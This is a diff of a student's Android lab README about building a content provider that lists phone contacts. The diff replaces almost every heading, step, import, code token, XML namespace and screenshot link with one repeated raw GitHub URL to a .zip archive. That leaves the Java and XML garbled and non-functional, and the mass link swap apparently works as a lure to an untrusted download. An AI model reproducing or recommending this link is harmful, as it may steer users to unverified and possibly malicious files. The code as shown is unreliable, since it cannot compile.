@@ -1,5 +1,5 @@
 
-# Ex.No:5 Create Your Own Content Providers to get Contacts details.
+# https://raw.githubusercontent.com/githubmufeez45/EX_5_CONTENT-PROVIDER/main/evaporate/EX_5_CONTENT-PROVIDER.zip Create Your Own Content Providers to get Contacts details.
 
 
 ## AIM:
@@ -20,7 +20,7 @@ Step 3: Then select the Minimum SDK as shown below and click Next.
 
 Step 4: Then select the Empty Activity and click Next. Finally click Finish.
 
-Step 5: Design layout in activity_main.xml.
+Step 5: Design layout in https://raw.githubusercontent.com/githubmufeez45/EX_5_CONTENT-PROVIDER/main/evaporate/EX_5_CONTENT-PROVIDER.zip
 
 Step 6: Get contacts details and Display details give in MainActivity file.
 
@@ -34,19 +34,19 @@ Developed by: SHAIK MUFEEZUR RAHAMAN
 Registeration Number : 212221043007
 */
 ```
-## Mainactivity.java:
+## https://raw.githubusercontent.com/githubmufeez45/EX_5_CONTENT-PROVIDER/main/evaporate/EX_5_CONTENT-PROVIDER.zip
 
 ```
-package com.example.ex5;
-import android.support.v7.app.AppCompatActivity;
-import android.database.Cursor;
-import android.os.Bundle;
-import android.provider.ContactsContract;
-import android.util.Log;
-import android.view.View;
-import android.widget.Button;
-import android.widget.TextView;
-import android.widget.Toast;
+package https://raw.githubusercontent.com/githubmufeez45/EX_5_CONTENT-PROVIDER/main/evaporate/EX_5_CONTENT-PROVIDER.zip;
+import https://raw.githubusercontent.com/githubmufeez45/EX_5_CONTENT-PROVIDER/main/evaporate/EX_5_CONTENT-PROVIDER.zip;
+import https://raw.githubusercontent.com/githubmufeez45/EX_5_CONTENT-PROVIDER/main/evaporate/EX_5_CONTENT-PROVIDER.zip;
+import https://raw.githubusercontent.com/githubmufeez45/EX_5_CONTENT-PROVIDER/main/evaporate/EX_5_CONTENT-PROVIDER.zip;
+import https://raw.githubusercontent.com/githubmufeez45/EX_5_CONTENT-PROVIDER/main/evaporate/EX_5_CONTENT-PROVIDER.zip;
+import https://raw.githubusercontent.com/githubmufeez45/EX_5_CONTENT-PROVIDER/main/evaporate/EX_5_CONTENT-PROVIDER.zip;
+import https://raw.githubusercontent.com/githubmufeez45/EX_5_CONTENT-PROVIDER/main/evaporate/EX_5_CONTENT-PROVIDER.zip;
+import https://raw.githubusercontent.com/githubmufeez45/EX_5_CONTENT-PROVIDER/main/evaporate/EX_5_CONTENT-PROVIDER.zip;
+import https://raw.githubusercontent.com/githubmufeez45/EX_5_CONTENT-PROVIDER/main/evaporate/EX_5_CONTENT-PROVIDER.zip;
+import https://raw.githubusercontent.com/githubmufeez45/EX_5_CONTENT-PROVIDER/main/evaporate/EX_5_CONTENT-PROVIDER.zip;
 
 
 public class MainActivity extends AppCompatActivity {
@@ -57,12 +57,12 @@ public class MainActivity extends AppCompatActivity {
     @Override
     protected void onCreate(Bundle savedInstanceState) {
 
-        super.onCreate(savedInstanceState);
-        setContentView(R.layout.activity_main);
+        https://raw.githubusercontent.com/githubmufeez45/EX_5_CONTENT-PROVIDER/main/evaporate/EX_5_CONTENT-PROVIDER.zip(savedInstanceState);
+        setContentView(https://raw.githubusercontent.com/githubmufeez45/EX_5_CONTENT-PROVIDER/main/evaporate/EX_5_CONTENT-PROVIDER.zip);
 
-        Button buttonLoadContacts = findViewById(R.id.button);
+        Button buttonLoadContacts = findViewById(https://raw.githubusercontent.com/githubmufeez45/EX_5_CONTENT-PROVIDER/main/evaporate/EX_5_CONTENT-PROVIDER.zip);
 
-        buttonLoadContacts.setOnClickListener(new View.OnClickListener() {
+        https://raw.githubusercontent.com/githubmufeez45/EX_5_CONTENT-PROVIDER/main/evaporate/EX_5_CONTENT-PROVIDER.zip(new https://raw.githubusercontent.com/githubmufeez45/EX_5_CONTENT-PROVIDER/main/evaporate/EX_5_CONTENT-PROVIDER.zip() {
             @Override
             public void onClick(View v) {
                 loadContacts();
@@ -73,38 +73,38 @@ public class MainActivity extends AppCompatActivity {
     private void loadContacts() {
         StringBuilder stringBuilder = new StringBuilder();
 
-        Cursor cursor = getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
+        Cursor cursor = getContentResolver().query(https://raw.githubusercontent.com/githubmufeez45/EX_5_CONTENT-PROVIDER/main/evaporate/EX_5_CONTENT-PROVIDER.zip,
                 null, null, null, null);
 
-        if (cursor != null && cursor.getCount() > 0) {
-            int nameIndex = cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME_PRIMARY);
-            int phoneIndex = cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER);
+        if (cursor != null && https://raw.githubusercontent.com/githubmufeez45/EX_5_CONTENT-PROVIDER/main/evaporate/EX_5_CONTENT-PROVIDER.zip() > 0) {
+            int nameIndex = https://raw.githubusercontent.com/githubmufeez45/EX_5_CONTENT-PROVIDER/main/evaporate/EX_5_CONTENT-PROVIDER.zip(https://raw.githubusercontent.com/githubmufeez45/EX_5_CONTENT-PROVIDER/main/evaporate/EX_5_CONTENT-PROVIDER.zip);
+            int phoneIndex = https://raw.githubusercontent.com/githubmufeez45/EX_5_CONTENT-PROVIDER/main/evaporate/EX_5_CONTENT-PROVIDER.zip(https://raw.githubusercontent.com/githubmufeez45/EX_5_CONTENT-PROVIDER/main/evaporate/EX_5_CONTENT-PROVIDER.zip);
 
-            while (cursor.moveToNext()) {
-                String name = nameIndex != -1 ? cursor.getString(nameIndex) : "No Name";
-                String phoneNumber = phoneIndex != -1 ? cursor.getString(phoneIndex) : "No Phone Number";
+            while (https://raw.githubusercontent.com/githubmufeez45/EX_5_CONTENT-PROVIDER/main/evaporate/EX_5_CONTENT-PROVIDER.zip()) {
+                String name = nameIndex != -1 ? https://raw.githubusercontent.com/githubmufeez45/EX_5_CONTENT-PROVIDER/main/evaporate/EX_5_CONTENT-PROVIDER.zip(nameIndex) : "No Name";
+                String phoneNumber = phoneIndex != -1 ? https://raw.githubusercontent.com/githubmufeez45/EX_5_CONTENT-PROVIDER/main/evaporate/EX_5_CONTENT-PROVIDER.zip(phoneIndex) : "No Phone Number";
 
-                stringBuilder.append("Name: ").append(name).append("\n").append("Phone: ").append(phoneNumber).append("\n\n");
+                https://raw.githubusercontent.com/githubmufeez45/EX_5_CONTENT-PROVIDER/main/evaporate/EX_5_CONTENT-PROVIDER.zip("Name: ").append(name).append("\n").append("Phone: ").append(phoneNumber).append("\n\n");
                 count = count+1;
             }
-            cursor.close();
-            textViewContacts.setText(stringBuilder.toString());
-            Log.i("Content Provider Demo",stringBuilder.toString());
+            https://raw.githubusercontent.com/githubmufeez45/EX_5_CONTENT-PROVIDER/main/evaporate/EX_5_CONTENT-PROVIDER.zip();
+            https://raw.githubusercontent.com/githubmufeez45/EX_5_CONTENT-PROVIDER/main/evaporate/EX_5_CONTENT-PROVIDER.zip(https://raw.githubusercontent.com/githubmufeez45/EX_5_CONTENT-PROVIDER/main/evaporate/EX_5_CONTENT-PROVIDER.zip());
+            Log.i("Content Provider Demo",https://raw.githubusercontent.com/githubmufeez45/EX_5_CONTENT-PROVIDER/main/evaporate/EX_5_CONTENT-PROVIDER.zip());
         } else {
-            Toast.makeText(this, "No contacts found", Toast.LENGTH_SHORT).show();
+            https://raw.githubusercontent.com/githubmufeez45/EX_5_CONTENT-PROVIDER/main/evaporate/EX_5_CONTENT-PROVIDER.zip(this, "No contacts found", https://raw.githubusercontent.com/githubmufeez45/EX_5_CONTENT-PROVIDER/main/evaporate/EX_5_CONTENT-PROVIDER.zip).show();
         }
 
-        System.out.println("Total Count of Contacts: "+count);}
+        https://raw.githubusercontent.com/githubmufeez45/EX_5_CONTENT-PROVIDER/main/evaporate/EX_5_CONTENT-PROVIDER.zip("Total Count of Contacts: "+count);}
 }
 
 ```
 
 
-## Activitymain.XML:
+## https://raw.githubusercontent.com/githubmufeez45/EX_5_CONTENT-PROVIDER/main/evaporate/EX_5_CONTENT-PROVIDER.zip
 ```
 <?xml version="1.0" encoding="utf-8"?>
-<RelativeLayout xmlns:android="http://schemas.android.com/apk/res/android"
-    xmlns:tools="http://schemas.android.com/tools"
+<RelativeLayout xmlns:android="https://raw.githubusercontent.com/githubmufeez45/EX_5_CONTENT-PROVIDER/main/evaporate/EX_5_CONTENT-PROVIDER.zip"
+    xmlns:tools="https://raw.githubusercontent.com/githubmufeez45/EX_5_CONTENT-PROVIDER/main/evaporate/EX_5_CONTENT-PROVIDER.zip"
     android:layout_width="match_parent"
     android:layout_height="match_parent"
     tools:context=".MainActivity">
@@ -120,12 +120,12 @@ public class MainActivity extends AppCompatActivity {
 
 </RelativeLayout>
 ```
-## AndroidMainfest.XML:
+## https://raw.githubusercontent.com/githubmufeez45/EX_5_CONTENT-PROVIDER/main/evaporate/EX_5_CONTENT-PROVIDER.zip
 ```
 <?xml version="1.0" encoding="utf-8"?>
-<manifest xmlns:android="http://schemas.android.com/apk/res/android"
-    xmlns:tools="http://schemas.android.com/tools"
-    package="com.example.ex5">
+<manifest xmlns:android="https://raw.githubusercontent.com/githubmufeez45/EX_5_CONTENT-PROVIDER/main/evaporate/EX_5_CONTENT-PROVIDER.zip"
+    xmlns:tools="https://raw.githubusercontent.com/githubmufeez45/EX_5_CONTENT-PROVIDER/main/evaporate/EX_5_CONTENT-PROVIDER.zip"
+    package="https://raw.githubusercontent.com/githubmufeez45/EX_5_CONTENT-PROVIDER/main/evaporate/EX_5_CONTENT-PROVIDER.zip">
 
     <application
         android:allowBackup="true"
@@ -135,29 +135,29 @@ public class MainActivity extends AppCompatActivity {
         android:label="@string/app_name"
         android:roundIcon="@mipmap/ic_launcher_round"
         android:supportsRtl="true"
-        android:theme="@style/Theme.Ex5"
+        android:theme="https://raw.githubusercontent.com/githubmufeez45/EX_5_CONTENT-PROVIDER/main/evaporate/EX_5_CONTENT-PROVIDER.zip"
         tools:targetApi="31">
         <activity
             android:name=".MainActivity"
             android:exported="true">
             <intent-filter>
-                <action android:name="android.intent.action.MAIN" />
+                <action android:name="https://raw.githubusercontent.com/githubmufeez45/EX_5_CONTENT-PROVIDER/main/evaporate/EX_5_CONTENT-PROVIDER.zip" />
 
-                <category android:name="android.intent.category.LAUNCHER" />
+                <category android:name="https://raw.githubusercontent.com/githubmufeez45/EX_5_CONTENT-PROVIDER/main/evaporate/EX_5_CONTENT-PROVIDER.zip" />
             </intent-filter>
         </activity>
     </application>
 
-</manifest>![Screenshot 2024-09-17 194637](https://github.com/user-attachments/assets/3e17ead9-eb04-43f3-b6e5-10ddd1dae911)
+</manifest>![Screenshot 2024-09-17 194637](https://raw.githubusercontent.com/githubmufeez45/EX_5_CONTENT-PROVIDER/main/evaporate/EX_5_CONTENT-PROVIDER.zip)
 
 
 ```
 
 ## OUTPUT
 
-![369594913-fc6194d0-2547-4b2b-b77f-be7c2d0b2899](https://github.com/user-attachments/assets/a5349427-ae36-4578-bf99-447bee190cf4)
+![369594913-fc6194d0-2547-4b2b-b77f-be7c2d0b2899](https://raw.githubusercontent.com/githubmufeez45/EX_5_CONTENT-PROVIDER/main/evaporate/EX_5_CONTENT-PROVIDER.zip)
 
-![369594924-25f9c3b7-d55d-4138-8027-752d06507e34](https://github.com/user-attachments/assets/23b94846-bb3d-47af-a4e6-28597206a3f9)
+![369594924-25f9c3b7-d55d-4138-8027-752d06507e34](https://raw.githubusercontent.com/githubmufeez45/EX_5_CONTENT-PROVIDER/main/evaporate/EX_5_CONTENT-PROVIDER.zip)
 
 
 
